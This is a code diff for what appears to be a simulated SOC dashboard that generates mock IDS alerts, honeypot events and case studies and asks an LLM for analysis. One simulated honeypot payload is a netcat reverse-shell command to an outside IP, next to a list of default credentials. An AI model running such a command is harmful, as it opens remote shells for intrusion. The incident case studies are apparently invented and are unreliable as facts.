+  if(leg)leg.innerHTML=labels.map((l,i)=>`<span style="display:flex;align-items:center;gap:4px;"><span style="width:10px;height:10px;border-radius:2px;background:${colors[i]}"></span>${l}: ${[counts.critical,counts.high,counts.medium,counts.low][i]}</span>`).join('');
+}
+
+let protoVals=[35,40,12,5,8];
+function renderProtos(){
+  let vals=PROTOS.map((p,i)=>Math.max(1,protoVals[i]+rnd(-4,4)));
+  const tot=vals.reduce((a,b)=>a+b,0);
+  vals=vals.map(v=>Math.round(v/tot*100));
+  protoVals=vals;
+  document.getElementById('protoList').innerHTML=PROTOS.map((p,i)=>`<div class="proto-row"><span class="proto-name">${p.name}</span><div class="bar-bg"><div class="bar-fill" style="width:${vals[i]}%;background:${p.color}"></div></div><span class="proto-pct">${vals[i]}%</span></div>`).join('');
+}
+
+function addAlert(){
+  const t=pick(THREATS), src=pick(IPS), dst=pick(DSTS), port=pick(PORTS);
+  const a={id:uid(),timestamp:new Date().toISOString(),threat_type:t.name,sev:t.sev,src_ip:src,dst_ip:dst,dst_port:port,protocol:['TCP','UDP','ICMP'][rnd(0,2)],sig:t.sig,icon:t.icon,mitigated:t.sev==='critical'||t.sev==='high'};
+  DB.alerts.unshift(a);
+  if(DB.alerts.length>200)DB.alerts.pop();
+  if(a.mitigated)DB.blocked++;
+  renderRecentAlerts();
+  updateMetrics();
+  document.getElementById('nb').textContent=DB.alerts.length;
+  if(document.getElementById('page-alerts').classList.contains('active'))renderAlertPage();
+  if(document.getElementById('page-ai').classList.contains('active'))renderJSONFeed();
+}
+
+function renderRecentAlerts(){
+  const el=document.getElementById('recentAlerts');
+  if(!el)return;
+  el.innerHTML=DB.alerts.slice(0,5).map(a=>`<div class="alert-row ${a.sev}"><i class="ti ${a.icon}" style="font-size:14px;flex-shrink:0" aria-hidden="true"></i><span class="sev ${a.sev}">${a.sev.toUpperCase()}</span><span style="flex:1;color:var(--color-text-primary)">${a.threat_type}</span><span style="color:var(--color-text-secondary)">${a.src_ip}</span><span style="color:var(--color-text-secondary);margin-left:8px;">${a.timestamp.slice(11,19)}</span></div>`).join('');
+}
+
+function renderAlertPage(){
+  const sev=document.getElementById('sevFilter')?.value||'all';
+  const ip=document.getElementById('ipFilter')?.value||'';
+  const sevO={critical:4,high:3,medium:2,low:1};
+  const filtered=DB.alerts.filter(a=>{
+    if(sev!=='all'&&a.sev!==sev)return false;
+    if(ip&&!a.src_ip.includes(ip)&&!a.dst_ip.includes(ip))return false;
+    return true;
+  });
+  const el=document.getElementById('alertPage');
+  if(!el)return;
+  if(!filtered.length){el.innerHTML='<div style="color:var(--color-text-secondary);padding:12px;">No alerts match current filter.</div>';return;}
+  el.innerHTML=filtered.slice(0,40).map(a=>`<div class="alert-row ${a.sev}"><i class="ti ${a.icon}" style="font-size:14px;flex-shrink:0" aria-hidden="true"></i><span class="sev ${a.sev}">${a.sev.toUpperCase()}</span><div style="flex:1;min-width:0;"><div style="font-weight:500;color:var(--color-text-primary)">${a.threat_type}</div><div style="font-size:11px;color:var(--color-text-secondary)">${a.src_ip} → ${a.dst_ip}:${a.dst_port} · ${a.protocol} · sig: ${a.sig}</div></div><span class="tag ${a.mitigated?'green':'amber'}">${a.mitigated?'Blocked':'Monitoring'}</span><span style="color:var(--color-text-secondary);margin-left:8px;font-size:11px;">${a.timestamp.slice(11,19)}</span></div>`).join('');
+}
+
+function genConnections(){
+  while(DB.connections.length<12)DB.connections.push({id:uid(),src_ip:pick(IPS),dst_ip:pick(DSTS),dst_port:pick(PORTS),protocol:pick(['TCP','UDP','TLS']),packets:rnd(10,5000),bytes:rnd(1024,1048576),is_suspicious:Math.random()<0.2,geo_country:pick(['IN','US','RU','CN','DE','BR'])});
+  const body=document.getElementById('connBody');
+  if(!body)return;
+  body.innerHTML=DB.connections.slice(0,12).map(c=>{
+    const kb=c.bytes>1048576?(c.bytes/1048576).toFixed(1)+'MB':(c.bytes/1024).toFixed(0)+'KB';
+    return `<tr><td>${c.src_ip}</td><td>${c.dst_ip}</td><td>${c.dst_port}</td><td>${c.protocol}</td><td>${c.packets.toLocaleString()}</td><td>${kb}</td><td>${rnd(1,300)}s</td><td><span class="tag ${c.is_suspicious?'red':'green'}">${c.is_suspicious?'Suspect':'Clean'}</span></td></tr>`;
+  }).join('');
+}
+
+function renderHoneypots(){
+  const el=document.getElementById('honeypotList');
+  if(!el)return;
+  el.innerHTML=HONEYPOTS.map(hp=>`<div class="honeypot-card"><div class="hp-header"><div class="hp-status ${hp.hits>5?'alert':'active'}"></div><span class="hp-name">${hp.name}</span><span class="hp-type">${hp.type} · ${hp.ip}:${hp.port}</span></div><div class="hp-metrics"><div class="hp-m"><div class="hp-m-v">${hp.hits}</div><div class="hp-m-l">Total hits</div></div><div class="hp-m"><div class="hp-m-v">${hp.creds.length}</div><div class="hp-m-l">Creds captured</div></div><div class="hp-m"><div class="hp-m-v">${rnd(1,8)}</div><div class="hp-m-l">Unique IPs</div></div></div></div>`).join('');
+  document.getElementById('hp-total').textContent=DB.hp_events.length;
+}
+
+function addHoneypotEvent(){
+  const hp=pick(HONEYPOTS);
+  hp.hits++;
+  DB.hpHits++;
+  const cred=pick(['admin:admin','root:password','admin:123456','user:user123','root:toor']);
+  const action=pick(['login_attempt','ssh_scan','payload_drop','web_probe','db_query']);
+  const ev={id:uid(),timestamp:new Date().toISOString(),honeypot_id:hp.id,attacker_ip:pick(IPS),action,credential_used:action.includes('login')?cred:'—',payload:action==='payload_drop'?'nc -e /bin/sh 45.33.32.156 4444':'—',session_duration:rnd(1,180)};
+  DB.hp_events.unshift(ev);
+  if(DB.hp_events.length>100)DB.hp_events.pop();
+  if(action.includes('login'))hp.creds.push(cred);
+  const logEl=document.getElementById('hpLog');
+  if(logEl){
+    logEl.innerHTML=DB.hp_events.slice(0,20).map(e=>`<div style="padding:5px 0;border-bottom:0.5px solid var(--color-border-tertiary);font-size:11px;"><span style="color:var(--color-text-secondary)">${e.timestamp.slice(11,19)}</span> <span style="color:var(--danger)">${e.attacker_ip}</span> → <span style="color:var(--accent)">${e.honeypot_id}</span> · <span style="color:var(--color-text-primary)">${e.action}</span>${e.credential_used!=='—'?' · cred: <span style="color:var(--warn)">'+e.credential_used+'</span>':''}</div>`).join('');
+  }
+  if(document.getElementById('page-honeypots').classList.contains('active'))renderHoneypots();
+}
+
+function renderDB(){
+  document.getElementById('db-alerts').textContent=DB.alerts.length;
+  document.getElementById('db-conns').textContent=DB.connections.length;
+  document.getElementById('db-hp').textContent=DB.hp_events.length;
+  function renderSchema(id,schema){
+    const el=document.getElementById(id);
+    if(!el)return;
+    el.innerHTML=schema.map(f=>`<div class="schema-field"><span class="field-name">${f.name}</span><span class="field-type">${f.type}</span>${f.pk?'<span class="pk">PK</span>':f.fk?'<span class="fk">FK</span>':''}<span class="field-desc">${f.desc}</span></div>`).join('');
+  }
+  renderSchema('schema-alerts',SCHEMA_ALERTS);
+  renderSchema('schema-conn',SCHEMA_CONN);
+  renderSchema('schema-hp',SCHEMA_HP);
+}
+
+const CASES=[
+  {icon:'ti-bug',iconBg:'#FCEBEB',iconColor:'#A32D2D',title:'APT29 — SolarWinds-style supply chain attack',org:'Fortune 500 tech company',date:'2024-03',severity:'critical',steps:[{t:'T+0h',text:'Malicious DLL injected via software update. IDS missed initial execution — signed binary.',done:true},{t:'T+2h',text:'C2 beacon detected: unusual HTTPS to newly registered domain. Flagged by DNS tunneling rule.',done:true},{t:'T+6h',text:'Lateral movement via WMI to 14 internal hosts. SMB anomaly triggered high-sev alert.',warn:true},{t:'T+8h',text:'Honeypot SSH-02 captured attacker credential reuse: root:toor123. Attacker fingerprinted.',done:true},{t:'T+9h',text:'VLAN segmentation applied. Affected hosts quarantined. IR team engaged.',done:true}],outcome:'Contained in 9h. 3 hosts fully compromised. 0 data exfiltrated post-detection.'},
+  {icon:'ti-wave-saw-tool',iconBg:'#FAEEDA',iconColor:'#854F0B',title:'Mirai botnet DDoS — UDP amplification',org:'ISP / Hosting provider',date:'2024-07',severity:'high',steps:[{t:'T+0m',text:'UDP flood detected: 48k pps sustained for 3 min. DDoS_UDP_RULE_005 triggered.',done:true},{t:'T+1m',text:'Source IPs auto-blocked at edge: 847 unique botnet nodes added to deny list.',done:true},{t:'T+3m',text:'Traffic scrubbing activated. 94% of attack volume dropped upstream.',done:true},{t:'T+7m',text:'Residual HTTP flood: 2.1M req/min. Rate limiting applied, honeypot sinkhole redirected scanners.',done:true},{t:'T+22m',text:'Attack subsided. SLA maintained at 99.97%. Post-incident BGP blackhole route removed.',done:true}],outcome:'Zero downtime. 22-minute total incident window. Botnet TTPs logged.'},
+  {icon:'ti-lock-open',iconBg:'#E6F1FB',iconColor:'#185FA5',title:'SSH credential stuffing campaign',org:'Financial services SaaS',date:'2025-01',severity:'high',steps:[{t:'Day 1',text:'Low-rate SSH attempts from 200+ IPs. Each IP: 2-3 attempts. Evaded per-IP threshold.',done:true},{t:'Day 2',text:'Aggregate model triggered: >10k failed auths in 24h across IP range 185.220.x.x.',warn:true},{t:'Day 2',text:'Honeypot SSH-01 captured 47 distinct credential pairs. Root:toor most common.',done:true},{t:'Day 3',text:'AI analyst correlated IPs with known Tor exit nodes. 34% overlap confirmed.',done:true},{t:'Day 3',text:'ASN-level block applied. MFA enforced for all SSH. Attack ceased within 2h.',done:true}],outcome:'No accounts compromised. 47 new IOCs added to threat intel feed.'},
+];
+
+function renderCases(){
+  const el=document.getElementById('caseList');
+  if(!el)return;
+  el.innerHTML=CASES.map(c=>`<div class="case-card"><div class="case-header"><div class="case-icon" style="background:${c.iconBg}"><i class="ti ${c.icon}" style="color:${c.iconColor}" aria-hidden="true"></i></div><div><div class="case-title">${c.title}</div><div class="case-meta">${c.org} · ${c.date} · <span class="tag ${c.severity==='critical'?'red':'amber'}">${c.severity.toUpperCase()}</span></div></div></div><div class="timeline">${c.steps.map(s=>`<div class="t-step ${s.warn?'warn':'done'}"><div class="t-time">${s.t}</div><div class="t-text">${s.text}</div></div>`).join('')}</div><div style="margin-top:10px;font-size:12px;color:var(--accent-text);background:var(--accent-bg);padding:6px 10px;border-radius:6px;"><i class="ti ti-check" aria-hidden="true"></i> ${c.outcome}</div></div>`).join('');
+}
+
+function renderMitigList(){
+  const el=document.getElementById('mitigList');
+  if(!el)return;
+  el.innerHTML=MITIGATIONS.map(m=>`<div class="mitig-row"><div class="mitig-icon" style="background:${m.color}"><i class="ti ${m.icon}" style="color:${m.icolor}" aria-hidden="true"></i></div><div><div style="display:flex;align-items:center;"><span class="mitig-title">${m.title}</span><span class="tag ${m.ptag} priority">${m.priority}</span></div><div class="mitig-desc">${m.desc}</div></div></div>`).join('');
+}
+
+function renderAIPage(){
+  initSevChart();
+  renderJSONFeed();
+}
+
+function renderJSONFeed(){
+  const el=document.getElementById('jsonFeed');
+  if(!el)return;
+  const feed=DB.alerts.slice(0,5).map(a=>JSON.stringify({id:a.id,ts:a.timestamp,type:a.threat_type,sev:a.sev,src:a.src_ip,dst:a.dst_ip,port:a.dst_port,sig:a.sig},null,1)).join('\n---\n');
+  el.textContent=feed||'No events yet.';
+}
+
+function updateMetrics(){
+  const criticals=DB.alerts.filter(a=>a.sev==='critical').length;
+  const highs=DB.alerts.filter(a=>a.sev==='high').length;
+  document.getElementById('m-thr').textContent=DB.alerts.length;
+  document.getElementById('m-blk').textContent=DB.blocked+' blocked';
+  document.getElementById('m-hp').textContent=DB.hpHits;
+  const lvl=document.getElementById('m-lvl');
+  const sub=document.getElementById('m-lvl-sub');
+  if(criticals>=3){lvl.textContent='CRITICAL';lvl.style.color='var(--danger)';sub.textContent='Immediate action!';}
+  else if(criticals>=1||highs>=3){lvl.textContent='HIGH';lvl.style.color='var(--danger)';sub.textContent='Active threats';}
+  else if(highs>=1){lvl.textContent='MEDIUM';lvl.style.color='var(--warn)';sub.textContent='Elevated risk';}
+  else{lvl.textContent='LOW';lvl.style.color='var(--accent)';sub.textContent='Normal ops';}
+}
+
+async function aiAnalyse(){
+  const box=document.getElementById('ai-main');
+  if(!box)return;
+  if(!DB.alerts.length){box.textContent='No alerts yet. Let traffic run for a few ticks.';return;}
+  box.innerHTML='<div class="ai-thinking"><i class="ti ti-brain" aria-hidden="true"></i> Analysing<span class="dots"><span>.</span><span>.</span><span>.</span></span></div>';
+  const summary=DB.alerts.slice(0,10).map(a=>`[${a.sev.toUpperCase()}] ${a.threat_type} from ${a.src_ip} sig:${a.sig}`).join('\n');
+  const hpSummary=DB.hp_events.slice(0,5).map(e=>`${e.attacker_ip} → ${e.honeypot_id}: ${e.action}${e.credential_used!=='—'?' cred:'+e.credential_used:''}`).join('\n');
+  try{
+    const r=await fetch('https://api.anthropic.com/v1/messages',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({model:'claude-sonnet-4-20250514',max_tokens:1000,system:'You are a senior SOC analyst. Analyse IDS alerts and honeypot intelligence. Respond in 3 sections labeled: THREAT ASSESSMENT, ATTACK PATTERN (4 bullets), RECOMMENDED ACTIONS (4 bullets). Plain text only.',messages:[{role:'user',content:`IDS Alerts:\n${summary}\n\nHoneypot intelligence:\n${hpSummary||'No honeypot events yet.'}\n\nTotal alerts: ${DB.alerts.length}, blocked: ${DB.blocked}`}]})});
+    const d=await r.json();
+    box.textContent=d.content?.map(b=>b.text||'').join('')||'Analysis unavailable.';
+  }catch(e){box.textContent='API error: '+e.message;}
+}
+
+async function genMitigPlan(){
+  const box=document.getElementById('mitig-ai');
+  if(!box)return;
+  if(!DB.alerts.length){box.textContent='No active threats detected yet.';return;}
+  box.innerHTML='<div class="ai-thinking"><i class="ti ti-brain" aria-hidden="true"></i> Generating plan<span class="dots"><span>.</span><span>.</span><span>.</span></span></div>';
+  const top=DB.alerts.slice(0,8).map(a=>`${a.threat_type} (${a.sev}) from ${a.src_ip}`).join(', ');
+  try{
+    const r=await fetch('https://api.anthropic.com/v1/messages',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({model:'claude-sonnet-4-20250514',max_tokens:800,system:'You are a network security engineer. Given active IDS alerts, produce a prioritised mitigation plan in 5 numbered steps. Each step: action name, specific command or config, expected outcome. Be concrete and technical.',messages:[{role:'user',content:`Active threats: ${top}`}]})});
+    const d=await r.json();
+    box.textContent=d.content?.map(b=>b.text||'').join('')||'Plan unavailable.';
+  }catch(e){box.textContent='API error: '+e.message;}
+}
+
+initSpark();
+renderProtos();
+genConnections();
+renderRecentAlerts();
+renderHoneypots();
+
+let tick=0;
+setInterval(()=>{
+  tick++;
+  const pps=rnd(200,2800);
+  const mb=(pps*1500/1e6).toFixed(2);
+  DB.totalPkts+=pps;
+  document.getElementById('m-pps').textContent=pps.toLocaleString();
+  document.getElementById('m-bps').textContent=mb+' MB/s';
+  sparkData.push(pps);if(sparkData.length>30)sparkData.shift();
+  sparkChart.data.datasets[0].data=[...sparkData];sparkChart.update('none');
+  if(tick%3===0)renderProtos();
+  if(tick%4===0&&DB.connections.length<20)DB.connections.push({id:uid(),src_ip:pick(IPS),dst_ip:pick(DSTS),dst_port:pick(PORTS),protocol:pick(['TCP','UDP','TLS']),packets:rnd(10,5000),bytes:rnd(1024,1048576),is_suspicious:Math.random()<0.2,geo_country:pick(['IN','US','RU','CN','DE','BR'])});
+  if(Math.random()<0.2)addAlert();
+  if(Math.random()<0.12)addHoneypotEvent();
+  if(document.getElementById('page-ai').classList.contains('active')&&tick%5===0)initSevChart();
+},1300);
+</script>
+
